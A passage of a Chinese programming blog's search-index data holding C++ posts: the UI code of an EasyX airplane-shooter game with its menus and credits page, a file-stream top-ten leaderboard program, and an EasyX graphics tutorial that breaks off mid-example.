难度设置为中等 &#125;); addButton(3, difficulty_medium); // 将按钮添加到页面 // 在游戏难度页面创建地狱按钮 Button *difficulty_hard = new Button(320, 420, 160, 60, L&quot;地狱&quot;, [&amp;]() &#123; difficulty = 3; // 难度设置为地狱 &#125;); addButton(3, difficulty_hard); // 将按钮添加到页面 // 在游戏难度页面创建返回按钮 Button *difficulty_exit = new Button(320, 530, 160, 60, L&quot;返回开始界面&quot;, [&amp;]() &#123; setCurrentIndex(1); // 返回开始界面 &#125;); addButton(3, difficulty_exit); // 将按钮添加到页面 // 4. 创建排行榜页面 drawpage(L&quot;./resource/page/rank.jpg&quot;, rank_name); // 在排行榜页面创建简单按钮 Button *rank_easy = new Button(320, 200, 160, 60, L&quot;简单榜&quot;, [&amp;]() &#123; setCurrentIndex(7); // 进入简单排行榜 &#125;); addButton(4, rank_easy); // 将按钮添加到页面 // 在排行榜页面创建中等按钮 Button *rank_medium = new Button(320, 310, 160, 60, L&quot;中等榜&quot;, [&amp;]() &#123; setCurrentIndex(8); // 进入中等排行榜 &#125;); addButton(4, rank_medium); // 将按钮添加到页面 // 在排行榜页面创建地狱按钮 Button *rank_hard = new Button(320, 420, 160, 60, L&quot;地狱榜&quot;, [&amp;]() &#123; setCurrentIndex(9); // 进入地狱排行榜 &#125;); addButton(4, rank_hard); // 将按钮添加到页面 // 在排行榜页面创建返回按钮 Button *rank_exit = new Button(320, 530, 160, 60, L&quot;返回开始界面&quot;, [&amp;]() &#123; setCurrentIndex(1); // 返回开始界面 &#125;); addButton(4, rank_exit); // 将按钮添加到页面 // 5. 游戏设置界面 drawpage(L&quot;./resource/page/set.jpg&quot;, set_name); // 在开始界面的设置界面页面创建音效按钮 Button *setinstart_music = new Button(320, 200, 160, 60, L&quot;打开/关闭音效&quot;, [&amp;]() &#123; controlsound(); // 控制音效 &#125;); addButton(5, setinstart_music); // 将按钮添加到页面 // 在开始界面的设置界面页面创建游戏玩法按钮 Button *setinstart_rule = new Button(320, 310, 160, 60, L&quot;游戏玩法&quot;, [&amp;]() &#123; setCurrentIndex(11); // 进入游戏玩法 &#125;); addButton(5, setinstart_rule); // 将按钮添加到页面 // 在开始界面的设置界面页面创建制作组信息按钮 Button *setinstart_author = new Button(320, 420, 160, 60, L&quot;制作组信息&quot;, [&amp;]() &#123; setCurrentIndex(10); // 进入制作组信息界面 &#125;); addButton(5, setinstart_author); // 将按钮添加到页面 // 在开始界面的设置界面页面创建返回按钮 Button *setinstart_exit = new Button(320, 530, 160, 60, L&quot;返回开始界面&quot;, [&amp;]() &#123; setCurrentIndex(1); // 返回开始界面 &#125;); addButton(5, setinstart_exit); // 将按钮添加到页面 // 6. 创建暂停界面 drawpage(L&quot;./resource/page/stop.jpg&quot;, stop_name); // 在暂停页面创建继续游戏按钮 Button *stop_continue = new Button(320, 200, 160, 60, L&quot;继续游戏&quot;, [&amp;]() &#123; setCurrentIndex(2); // 返回游戏界面 &#125;); addButton(6, stop_continue); // 将按钮添加到页面 // 在暂停页面创建重新开始按钮 Button *stop_restart = new Button(320, 310, 160, 60, L&quot;重新开始&quot;, [&amp;]() &#123; setCurrentIndex(2); // 初始化数据并返回游戏界面 &#125;); addButton(6, stop_restart); // 将按钮添加到页面 // 在暂停页面创建音效按钮 Button *stop_music = new Button(320, 420, 160, 60, L&quot;打开/关闭音效&quot;, [&amp;]() &#123; controlsound(); // 设置音效 &#125;); addButton(6, stop_music); // 将按钮添加到页面 // 在暂停界面创建返回开始界面按钮 Button *stop_exit = new Button(320, 530, 160, 60, L&quot;返回开始界面&quot;, [&amp;]() &#123; setCurrentIndex(1); // 返回开始界面 &#125;); addButton(6, stop_exit); // 将按钮添加到页面 // 7. 简单榜 drawpage(L&quot;./resource/page/easy.jpg&quot;, easy_name, 0); // 在简单榜界面创建返回排行榜界面按钮 Button *easy_exit = new Button(320, 530, 160, 60, L&quot;返回排行榜&quot;, [&amp;]() &#123; setCurrentIndex(4); // 返回排行榜界面 &#125;); addButton(7, easy_exit); // 将按钮添加到页面 // 8. 中等榜 drawpage(L&quot;./resource/page/medium.jpg&quot;, medium_name, 0); // 在中等榜界面创建返回排行榜界面按钮 Button *medium_exit = new Button(320, 530, 160, 60, L&quot;返回排行榜&quot;, [&amp;]() &#123; setCurrentIndex(4); // 返回排行榜界面 &#125;); addButton(8, medium_exit); // 将按钮添加到页面 // 9. 地狱榜 drawpage(L&quot;./resource/page/hard.jpg&quot;, hard_name, 0); // 在地狱榜界面创建返回排行榜界面按钮 Button *hard_exit = new Button(320, 530, 160, 60, L&quot;返回排行榜&quot;, [&amp;]() &#123; setCurrentIndex(4); // 返回排行榜界面 &#125;); addButton(9, medium_exit); // 将按钮添加到页面 // 10. 制作组 IMAGE *page_author = new IMAGE(width, height); loadimage(page_author, L&quot;./resource/page/author.jpg&quot;, width, height, true); putimage(0, 0, page_author); // 绘制制作组标题 RECT rect_author = &#123; 220, 50, 580, 150 &#125;; fillroundrect(rect_author.left, rect_author.top, rect_author.right, rect_author.bottom, 50, 50); // 绘制标题 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(35, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 text_x = rect_author.left + (rect_author.right - rect_author.left - textwidth(author_name.c_str())) / 2; text_y = rect_author.top + (rect_author.bottom - rect_author.top - textheight(author_name.c_str())) / 2; outtextxy(text_x, text_y, author_name.c_str()); // 在按钮上绘制文本 fillroundrect(rect_author.left - 100, rect_author.top + 120, rect_author.right + 100, rect_author.bottom + 370, 50, 50); // 绘制标题 settextstyle(28, 0, _T(&quot;华文彩云&quot;)); // 设置文本大小和字体 outtextxy(rect_author.left - 40, rect_author.top + 130, L&quot;成员&quot;); // 绘制昵称 outtextxy(rect_author.left + 220, rect_author.top + 130, L&quot;负责部分&quot;); // 绘制简介 settextstyle(25, 0, _T(&quot;华光行楷_CNKI&quot;)); // 设置文本大小和字体 settextcolor(RGB(49, 128, 87)); // 设置文本颜色 outtextxy(rect_author.left - 40, rect_author.top + 170, L&quot;邓钦予&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 200, L&quot;何宁&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 230, L&quot;祖培宏&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 260, L&quot;李丰任&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 290, L&quot;杨永山泰&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 320, L&quot;千反田&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 350, L&quot;苏子乔&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 380, L&quot;沈兴满&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 410, L&quot;阿聪&quot;); // 绘制昵称 outtextxy(rect_author.left - 40, rect_author.top + 440, L&quot;岳永&quot;); // 绘制昵称 outtextxy(rect_author.left + 160, rect_author.top + 170, L&quot;游戏界面设计&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 200, L&quot;游戏BOSS生成和运行逻辑&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 230, L&quot;游戏功能流程图整理&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 260, L&quot;子弹设计和代码整合&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 290, L&quot;子弹设计和代码整合&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 320, L&quot;敌机生成和运行逻辑&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 350, L&quot;数据保存加载和排行榜制作&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 380, L&quot;游戏音效设置&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 410, L&quot;玩家战机生成和运行逻辑&quot;); // 绘制简介 outtextxy(rect_author.left + 160, rect_author.top + 440, L&quot;道具生成和运行逻辑&quot;); // 绘制简介 getimage(page_author, 0, 0, width, height); // 将页面的内容保存到图片中 addPage(page_author); // 添加制作组信息页面 // 在制作组界面创建返回按钮 Button *author_exit = new Button(320, 540, 160, 60, L&quot;返回设置&quot;, [&amp;]() &#123; setCurrentIndex(5); // 返回设置界面 &#125;); addButton(10, author_exit); // 将按钮添加到页面 // 11. 游戏玩法说明 IMAGE *page_rule = new IMAGE(width, height); loadimage(page_rule, L&quot;./resource/page/rule.jpg&quot;, width, height, true); putimage(0, 0, page_rule); // 绘制玩法标题 RECT rect_rule = &#123; 220, 50, 580, 150 &#125;; fillroundrect(rect_rule.left, rect_rule.top, rect_rule.right, rect_rule.bottom, 50, 50); // 绘制标题 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(35, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 text_x = rect_rule.left + (rect_rule.right - rect_rule.left - textwidth(rule_name.c_str())) / 2; text_y = rect_rule.top + (rect_rule.bottom - rect_rule.top - textheight(rule_name.c_str())) / 2; outtextxy(text_x, text_y, rule_name.c_str()); // 在按钮上绘制文本 fillroundrect(rect_rule.left - 80, rect_rule.top + 120, rect_rule.right + 80, rect_rule.bottom + 370, 50, 50); // 绘制标题 settextstyle(25, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 settextcolor(RGB(49, 128, 87)); // 设置文本颜色为黑色 outtextxy(rect_rule.left - 40, rect_rule.top + 140, L&quot;↑↓←→控制战机移动&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 180, L&quot;首页可以设置游戏难度&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 220, L&quot;昵称页面可以设置玩家昵称&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 260, L&quot;战机自动发射子弹&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 300, L&quot;击毁敌机分数增加, 被敌机击中生命值减少&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 340, L&quot;击毁BOSS游戏胜利, 生命值小于0游戏结束&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 380, L&quot;获得道具可以随机增加生命或子弹伤害&quot;); outtextxy(rect_rule.left - 40, rect_rule.top + 420, L&quot;游戏界面右上角可以暂停游戏&quot;); getimage(page_rule, 0, 0, width, height); // 将页面的内容保存到图片中 addPage(page_rule); // 添加玩法信息页面 // 在玩法界面创建返回按钮 Button *rule_exit = new Button(320, 540, 160, 60, L&quot;返回设置&quot;, [&amp;]() &#123; setCurrentIndex(5); // 返回设置界面 &#125;); addButton(11, rule_exit); // 将按钮添加到页面 // 12. 失败界面 IMAGE *page_fail = new IMAGE(width, height); loadimage(page_fail, L&quot;./resource/page/fail.jpg&quot;, width, height, true); putimage(0, 0, page_fail); // 绘制玩法标题 RECT rect_fail = &#123; 220, 50, 580, 150 &#125;; fillroundrect(rect_fail.left, rect_fail.top, rect_fail.right, rect_fail.bottom, 50, 50); // 绘制标题 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(35, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 text_x = rect_fail.left + (rect_fail.right - rect_fail.left - textwidth(fail_name.c_str())) / 2; text_y = rect_fail.top + (rect_fail.bottom - rect_fail.top - textheight(fail_name.c_str())) / 2; outtextxy(text_x, text_y, fail_name.c_str()); // 在按钮上绘制文本 fillroundrect(rect_fail.left, rect_fail.top + 120, rect_fail.right, rect_fail.bottom + 60, 50, 50); // 绘制安慰 settextstyle(25, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 outtextxy(rect_fail.left + 90, rect_fail.top + 130, L&quot;别走，决战到天亮！&quot;); // 绘制失败安慰 getimage(page_fail, 0, 0, width, height); // 将页面的内容保存到图片中 addPage(page_fail); // 添加失败页面 // 在失败页面创建音效设置按钮 Button *fail_music = new Button(320, 250, 160, 60, L&quot;打开/关闭音效&quot;, [&amp;]() &#123; controlsound(); // 音效设置 &#125;); addButton(12, fail_music); // 将按钮添加到页面 // 在失败页面创建再次挑战按钮 Button *fail_restart = new Button(320, 360, 160, 60, L&quot;再次挑战&quot;, [&amp;]() &#123; setCurrentIndex(2); // 初始化数据并返回游戏界面 &#125;); addButton(12, fail_restart); // 将按钮添加到页面 // 在失败页面创建返回按钮 Button *fail_exit = new Button(320, 470, 160, 60, L&quot;返回开始界面&quot;, [&amp;]() &#123; setCurrentIndex(1); // 初始化数据并返回游戏界面 &#125;); addButton(12, fail_exit); // 将按钮添加到页面 // 13. 成功界面 IMAGE *page_success = new IMAGE(width, height); loadimage(page_success, L&quot;./resource/page/success.jpg&quot;, width + 150, height, true); putimage(0, 0, page_success); loadimage(page_success, L&quot;./resource/page/666.png&quot;, 120, 120, true); drawAlpha(page_success, 130, 260); //绘制成功标题 RECT rect_success = &#123; 220, 60, 580, 200 &#125;; fillroundrect(rect_success.left, rect_success.top, rect_success.right, rect_success.bottom, 50, 50); // 绘制标题 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(35, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 text_x = rect_success.left + (rect_success.right - rect_success.left - textwidth(success_name.c_str())) / 2; text_y = rect_success.top + (rect_success.bottom - rect_success.top - textheight(success_name.c_str())) / 2; outtextxy(text_x, text_y, success_name.c_str()); // 在按钮上绘制文本 fillroundrect(rect_success.left - 120, rect_success.top + 190, rect_success.right - 340, rect_success.bottom + 90, 50, 50); // 绘制安慰 settextstyle(25, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 outtextxy(rect_success.left - 100, rect_success.top + 200, L&quot;牛哇牛哇！&quot;); // 绘制通关提示 getimage(page_success, 0, 0, width, height); // 将页面的内容保存到图片中 addPage(page_success); // 添加成功页面 // 在成功页面创建重新挑战按钮 Button *success_restart = new Button(320, 280, 180, 90, L&quot;重新挑战&quot;, [&amp;]() &#123; //init(); // 初始化数据并返回游戏界面 setCurrentIndex(2); &#125;); addButton(13, success_restart); // 将按钮添加到页面 // 在成功页面创建返回按钮 Button *success_exit = new Button(320, 420, 180, 90, L&quot;返回开始界面&quot;, [&amp;]() &#123; setCurrentIndex(1); // 初始化数据并返回游戏界面 &#125;); addButton(13, success_exit); // 将按钮添加到页面 setCurrentIndex(0); // 设置初始显示页面 FlushBatchDraw(); // 将缓冲区内容显示在屏幕上 &#125; // 运行，进入消息循环 void run() &#123; ExMessage msg; BeginBatchDraw(); // 开始批量绘制 while (true) &#123; if (peekmessage(&amp;msg)) // 检查是否有消息 &#123; int mouseX = msg.x; // 获取鼠标x坐标 int mouseY = msg.y; // 获取鼠标y坐标 switch (msg.message) &#123; case WM_LBUTTONDOWN: // 鼠标左键按下事件 mouseClick(mouseX, mouseY); // 处理鼠标点击事件 break; case WM_MOUSEMOVE: // 鼠标移动事件 mouseMove(mouseX, mouseY); // 处理鼠标移动事件 break; &#125; &#125; draw(); // 绘制当前页面内容 FlushBatchDraw(); // 将缓冲区内容显示在屏幕上 Sleep(10); &#125; EndBatchDraw(); // 结束批量绘制 &#125; // 关闭 void close() &#123; closegraph(); // 关闭图形环境 &#125;&#125;;int main()&#123; mciSendString(L&quot;open ./music/game_music.mp3&quot;, NULL, 0, NULL); mciSendString(L&quot;play ./music/game_music.mp3&quot;, NULL, 0, NULL); Widget widget(800, 640); widget.init(); widget.run(); widget.close(); return 0;&#125; 完整版项目体验下载地址","tags":"项目"},{"title":"文件流操作实现排行榜前十位","url":"/post/935c4202.html","text":"描述通过文件流实现录入用户信息和显示排行榜前十数据 练手题，写的有些乱 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;iomanip&gt;using namespace std;struct information&#123; string name = &quot;NULL&quot;; int score = -1;&#125; info[10];void view()&#123; ifstream fin; fin.open(&quot;./data.txt&quot;); if (!fin.is_open()) &#123; cout &lt;&lt; &quot;读取文件失败! &quot; &lt;&lt; endl; exit(1); &#125; int rank; string name; int score; cout &lt;&lt; setw(20) &lt;&lt; left &lt;&lt; &quot;排名&quot; &lt;&lt; setw(20) &lt;&lt; left &lt;&lt; &quot;昵称&quot; &lt;&lt; setw(20) &lt;&lt; left &lt;&lt; &quot;积分&quot; &lt;&lt; endl; while(fin &gt;&gt; rank &gt;&gt; name &gt;&gt; score) cout &lt;&lt; setw(20) &lt;&lt; left &lt;&lt; rank &lt;&lt; setw(20) &lt;&lt; left &lt;&lt; name &lt;&lt; setw(20) &lt;&lt; left &lt;&lt; score &lt;&lt; endl; cout &lt;&lt; &quot;---------------------------------------&quot; &lt;&lt; endl; fin.close();&#125;void read()&#123; int rank; ifstream fin; fin.open(&quot;./data.txt&quot;); if (!fin.is_open()) &#123; cout &lt;&lt; &quot;读取文件失败! &quot; &lt;&lt; endl; exit(1); &#125; int i = 0; while (fin &gt;&gt; rank &gt;&gt; info[i].name &gt;&gt; info[i].score) ++i; fin.close();&#125;void write()&#123; read(); ofstream fout; fout.open(&quot;./data.txt&quot;); if (!fout.is_open()) &#123; cout &lt;&lt; &quot;打开文件失败! &quot; &lt;&lt; endl; exit(1); &#125; string name; int score; int rank = 1; cout &lt;&lt; &quot;请输入您的昵称和积分: &quot;; cin &gt;&gt; name &gt;&gt; score; if (info[0].name == &quot;NULL&quot;) &#123; fout &lt;&lt; rank &lt;&lt; &quot; &quot; &lt;&lt; name &lt;&lt; &quot; &quot; &lt;&lt; score &lt;&lt; endl; &#125; else if (info[9].name != &quot;NULL&quot;) // 排行榜已经有10位 &#123; info[9].name = name; info[9].score = score; // 冒泡排序 for (int i = 0; i &lt; 10; ++i) &#123; for (int j = 0; j &lt; 9 - i; ++j) &#123; if (info[j].score &lt; info[j + 1].score) &#123; struct information temp; temp = info[j]; info[j] = info[j + 1]; info[j + 1] = temp; &#125; &#125; &#125; for (int i = 0; i &lt; 10; ++i) &#123; fout &lt;&lt; i + 1 &lt;&lt; &quot; &quot; &lt;&lt; info[i].name &lt;&lt; &quot; &quot; &lt;&lt; info[i].score &lt;&lt; endl; &#125; &#125; else &#123; int num = 0; // 统计在榜人数 for (; info[num].name != &quot;NULL&quot;; ++num) &#123;&#125; info[num].name = name; info[num].score = score; // 冒泡排序 for (int i = 0; i &lt; num; ++i) &#123; for (int j = 0; j &lt; num - i; ++j) &#123; if (info[j].score &lt; info[j + 1].score) &#123; struct information temp; temp = info[j]; info[j] = info[j + 1]; info[j + 1] = temp; &#125; &#125; &#125; for (int i = 0; i &lt; num + 1; ++i) &#123; fout &lt;&lt; i + 1 &lt;&lt; &quot; &quot; &lt;&lt; info[i].name &lt;&lt; &quot; &quot; &lt;&lt; info[i].score &lt;&lt; endl; &#125; &#125; cout &lt;&lt; &quot;---------------------------------------&quot; &lt;&lt; endl; fout.close();&#125;int menu()&#123; int choice; cout &lt;&lt; &quot;请问您需要查看还是写入文件: \\n1-&gt;查看\\n2-&gt;写入\\n输入其他任意字符退出程序&quot; &lt;&lt; endl; cin &gt;&gt; choice; switch (choice) &#123; case 1: view(); return 0; case 2: write(); return 0; default: cout &lt;&lt; &quot;程序即将退出...&quot; &lt;&lt; endl; return 1; &#125;&#125;int main() &#123; while (!menu())&#123;&#125; return 0;&#125;","tags":"c++文件流"},{"title":"Easyx常用操作","url":"/post/22f66066.html","text":"图形与文字绘制注意 很多函数有大小写两个版本，EasyX选全小写版本，WinSDK选大写版本 easyx.h自带windows.h 下图是EasyX安装路径 函数 示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;#include &lt;graphics.h&gt;using namespace std;struct round_rec&#123; int left; int top; int right; int bottom; int ew; int eh;&#125;;struct circle&#123; int x; int y; int r;&#125;;int main()&#123; /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(640, 480, SHOWCONSOLE); // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;欢迎来到DQY&amp;WYの小窝~&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串 // 设置背景颜色 setbkcolor(WHITE); // 清屏, 必须在设置背景颜色后使用才有效果 cleardevice(); /* 图形设置 */ // 设置线条样式，设置一次影响后面所有 // 实线；宽度5 setlinestyle(PS_SOLID, 5); // 设置线条颜色，设置一次影响后面所有 setlinecolor(BROWN); // 设置填充颜色，设置一次影响后面所有 setfillcolor(YELLOW); // 绘图 struct circle cir = &#123;50, 60, 50&#125;; circle(cir.x, cir.y, cir.r); struct circle fill_cir = &#123; 160, 60, 50 &#125;; fillcircle(fill_cir.x, fill_cir.y, fill_cir.r); struct circle solid_cir = &#123; 270, 60, 50 &#125;; solidcircle(solid_cir.x, solid_cir.y, solid_cir.r); struct round_rec fill_roundrec = &#123; 10, 150, 300, 300, 10, 50 &#125;; fillroundrect(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh); /* 文字设置 */ // 绘制文字, 字体默认白色 // 设置文字颜色 settextcolor(RGB(230, 103, 86)); // 设置文字样式 // 高度；宽度(0: 自适应)；系统字体 settextstyle(20, 0, L&quot;楷体&quot;); // 设置文字背景模式为透明 setbkmode(TRANSPARENT); // 居中输出文字 // L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集 wchar_t str[] = L&quot;大家好，我是快乐小凳凳！&quot;; // 求字符串宽度 int width = textwidth(str); // 求字符串高度 int height = textheight(str); // 横坐标 = left + ((right - left) - width) / 2 int x = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / 2; // 纵坐标 = top + ((bottom - top) - height) / 2 int y = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / 2; outtextxy(x, y, str); // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 图像加载函数 示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;graphics.h&gt;using namespace std;struct round_rec&#123; int left; int top; int right; int bottom; int ew; int eh;&#125;;int main()&#123; /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(640, 480); // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;DQY&amp;WYの小窝&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串 /* 加载并显示图片 */ // 图片对象 IMAGE img; // 加载图片：以CPP文件为起始位置 loadimage(&amp;img, L&quot;./images/1.jpg&quot;, 640, 480); putimage(0, 0, &amp;img); /* 文字设置 */ // 设置文字样式 // 高度；宽度(0: 自适应)；系统字体 settextstyle(20, 0, L&quot;楷体&quot;); // 设置文字背景模式为透明 setbkmode(TRANSPARENT); // 居中输出文字 // L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集 wchar_t str[] = L&quot;大家好，我是快乐小凳凳！&quot;; outtextxy(50, 50, str); wchar_t str1[] = L&quot;欢迎来到DQY&amp;WYの小窝~&quot;; outtextxy(50, 80, str1); // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 设置按钮1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void button()&#123; // 设置线条样式，设置一次影响后面所有 // 实线；宽度5 setlinestyle(PS_DASH, 5); // 设置线条颜色，设置一次影响后面所有 setlinecolor(BROWN); // 设置填充颜色，设置一次影响后面所有 setfillcolor(YELLOW); // 绘图 struct round_rec fill_roundrec = &#123; 50, 150, 150, 200, 10, 50 &#125;; fillroundrect(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh); /* 文字设置 */ settextcolor(BLACK); // 设置文字样式 // 高度；宽度(0: 自适应)；系统字体 settextstyle(20, 0, L&quot;楷体&quot;); // 设置文字背景模式为透明 setbkmode(TRANSPARENT); // 居中输出文字 // L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集 wchar_t str[] = L&quot;Button&quot;; // 求字符串宽度 int width = textwidth(str); // 求字符串高度 int height = textheight(str); // 横坐标 = left + ((right - left) - width) / 2 int x = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / 2; // 纵坐标 = top + ((bottom - top) - height) / 2 int y = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / 2; outtextxy(x, y, str); ExMessage msg; while (true) &#123; if (peekmessage(&amp;msg, EM_MOUSE)) &#123; switch (msg.message) &#123; case WM_LBUTTONDOWN: if (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom) &#123; cout &lt;&lt; &quot;您刚刚在坐标(&quot; &lt;&lt; msg.x &lt;&lt; &quot;, &quot; &lt;&lt; msg.y &lt;&lt; &quot;)按下了左键！&quot; &lt;&lt; endl; &#125; break; default: break; &#125; &#125; &#125;&#125; 键盘消息函数 示例1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;#include &lt;easyx.h&gt;#include &lt;conio.h&gt; // 使用_getch()using namespace std;int main()&#123; /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(640, 480, EW_SHOWCONSOLE); // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;欢迎来到DQY&amp;WYの小窝~&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串 /* 加载并显示图片 */ // 图片对象 IMAGE img; // 加载图片 loadimage(&amp;img, L&quot;./images/1.jpg&quot;, 640, 480); putimage(0, 0, &amp;img); // 设置线条样式，设置一次影响后面所有 // 实线；宽度5 setlinestyle(PS_DASH, 5); // 设置线条颜色，设置一次影响后面所有 setlinecolor(BROWN); // 设置填充颜色，设置一次影响后面所有 setfillcolor(YELLOW); int x = 50, y = 50; ExMessage msg; while (true) &#123; fillcircle(x, y, 50); // 键盘消息 char key = _getch(); switch (key) &#123; case 72: // 都代表上键 case &#x27;w&#x27;: case &#x27;W&#x27;: cout &lt;&lt; &quot;up&quot; &lt;&lt; endl; --y; break; case 80: // 都代表下键 case &#x27;s&#x27;: case &#x27;S&#x27;: cout &lt;&lt; &quot;down&quot; &lt;&lt; endl; ++y; break; case 75: // 都代表左键 case &#x27;a&#x27;: case &#x27;A&#x27;: cout &lt;&lt; &quot;left&quot; &lt;&lt; endl; --x; break; case 77: // 都代表右键 case &#x27;d&#x27;: case &#x27;D&#x27;: cout &lt;&lt; &quot;right&quot; &lt;&lt; endl; ++x; break; default: break; &#125; &#125; // 保留窗口 getchar(); // 关闭窗口 closegraph(); return 0;&#125; 示例2123456789101112131415161718192021// 键盘消息if (_kbhit())&#123;if (GetAsyncKeyState(VK_UP))&#123; y--;&#125;if (GetAsyncKeyState(VK_DOWN))&#123; y++;&#125;if (GetAsyncKeyState(VK_LEFT))&#123; x--;&#125;if (GetAsyncKeyState(VK_RIGHT))&#123; x++;&#125;Sleep(5);&#125; 批量绘制函数 示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#include &lt;iostream&gt;#include &lt;easyx.h&gt;#include &lt;conio.h&gt; // 使用_getch()using namespace std;struct round_rec&#123; int left; int top; int right; int bottom; int ew; int eh;&#125;;int main()&#123; /* 窗口设置 */ // 创建一个窗口, 宽640，高480 // initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE); initgraph(640, 480, EW_SHOWCONSOLE); // 设置窗口标题 HWND hnd = GetHWnd();//获取窗口句柄 SetWindowText(hnd, L&quot;欢迎来到DQY&amp;WYの小窝~&quot;);//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串 /* 加载并显示图片 */ // 图片对象 IMAGE img; // 加载图片 loadimage(&amp;img, L&quot;./images/1.jpg&quot;, 640, 480); // 设置线条样式，设置一次影响后面所有 // 实线；宽度5 setlinestyle(PS_DASH, 5); // 设置线条颜色，设置一次影响后面所有 setlinecolor(BROWN); // 设置填充颜色，设置一次影响后面所有 setfillcolor(YELLOW); // 绘图 struct round_rec fill_roundrec = &#123; 50, 150, 150, 200, 10, 50 &#125;; /* 文字设置 */ settextcolor(BLACK); // 设置文字样式 // 高度；宽度(0: 自适应)；系统字体 settextstyle(20, 0, L&quot;楷体&quot;); // 设置文字背景模式为透明 setbkmode(TRANSPARENT); // 居中输出文字 // L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集 wchar_t str[] = L&quot;Button&quot;; // 求字符串宽度 int width = textwidth(str); // 求字符串高度 int height = textheight(str); // 横坐标 = left + ((right - left) - width) / 2 int tx = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / 2; // 纵坐标 = top + ((bottom - top) - height) / 2 int ty = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / 2; int x = 50, y = 50; ExMessage msg; while (true) &#123; // 缓冲，防止图片闪烁 